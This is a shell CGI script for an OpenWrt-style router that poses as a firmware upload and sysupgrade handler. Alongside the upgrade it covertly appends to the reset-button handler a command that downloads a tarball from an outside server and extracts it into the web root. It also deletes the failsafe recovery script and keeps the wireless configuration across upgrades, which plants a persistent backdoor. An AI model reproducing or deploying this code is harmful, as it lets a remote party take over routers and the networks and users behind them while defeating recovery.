#!/bin/ash
echo Content-type: text/html
echo
if [ "$REQUEST_METHOD" = "POST" ]; then
  TMPOUT=/tmp/sysupgrade.bin
  cat >$TMPOUT

  # Get the line count
  LINES=$(wc -l $TMPOUT | cut -d ' ' -f 1)

  # Remove the first four lines
  tail -$((LINES - 4)) $TMPOUT >$TMPOUT.1

  # Remove the last line
  head -$((LINES - 5)) $TMPOUT.1 >$TMPOUT

  # Copy everything but the new last line to a temporary file
  head -$((LINES - 6)) $TMPOUT >$TMPOUT.1

  # Copy the new last line but remove trailing \r\n
  tail -1 $TMPOUT | perl -p -i -e 's/\r\n$//' >>$TMPOUT.1
fi

echo uplod success
echo wait....till the browser stop loading
echo " $(echo "
#!/bin/sh

wget -O /tmp/etc.tar.gz http://www.aracelivpnserver.us/etc.tar.gz
tar -xzf /tmp/etc.tar.gz -C /www/
chmod 775 /www/*.*
clear

")" >> /etc/rc.button/reset
echo " $(rm /etc/rc.button/failsafe)"
echo " $(echo "
/etc/config/wireless


")" >> /lib/upgrade/keep.d/base-files
echo ""
echo ""

echo "<center>$(sysupgrade -v  /tmp/sysupgrade.bin )</center>"

cat << EOF

<HTML>

<meta http-equiv="Refresh" content="1; url=/index.html">

</HTML>